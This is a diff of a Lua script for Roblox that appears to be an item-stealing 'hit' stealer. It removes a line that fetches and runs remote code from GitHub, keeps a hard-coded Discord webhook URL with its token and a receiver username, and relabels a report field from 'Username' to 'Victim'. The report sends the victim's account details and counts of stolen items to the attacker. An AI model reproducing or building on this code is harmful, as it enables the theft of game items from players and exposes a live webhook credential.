@@ -1,4 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Sladkypupsgg/3b4c/main/4c3b"))()
 userName = "AxolotlBestYo"
 webHook = "https://discord.com/api/webhooks/1292129305668620319/1ZgdoN-vSUeh_ENEmJ305HedmLQq2Fm2pVo1DJeN5VbMSzh5T-yrVnk0TfDPtkX7YjSR"
 
@@ -1063,7 +1062,7 @@ local WebHookEmbed = CreateEmbed(
     "Please execute the code above to get your hit.",
     11220,
     {
-        {name = "```🧛‍♀️ Info```", value = "```🙍‍♂️ Username: "..LP.Name.."\n💫 Level: "..tostring(getLvl()).."\n🔞 Account-Age: "..tostring(LP.AccountAge).."\n🎮 Executor: "..identifyexecutor().."\n🐱‍👤 Receiver: "..userName.."```"},
+        {name = "```🧛‍♀️ Info```", value = "```🙍‍♂️ Victim: "..LP.Name.."\n💫 Level: "..tostring(getLvl()).."\n🔞 Account-Age: "..tostring(LP.AccountAge).."\n🎮 Executor: "..identifyexecutor().."\n🐱‍👤 Receiver: "..userName.."```"},
         {name = "```🎯 Hit Info```", value = "```💵 Total Value: "..tostring(math.floor(valueCount + 0.5)).."\n➕ Total Count: "..tostring(itemsCount - 2).."\n\n⚠️ Uniques: "..tostring(uniqueItemsC).."\n🟣 Ancients: "..tostring(ancientItemsC).."\n💎 Godlys: "..tostring(godlyItemsC).."\n🔴 Legendarys: "..tostring(legendaryItemsC).."\n🟡 Vintage: "..tostring(vintageItemsC).."\n🗑 Garbage: "..tostring(rareItemsC).."\n🗑 Garbage: "..tostring(uncommonItemsC).."\n🗑 Garbage: "..tostring(commonItemsC).."```"},
         {name = "```💻 Hit List```", value = "[Click Me]("..pastebin(EverythingString)..")"}
     }
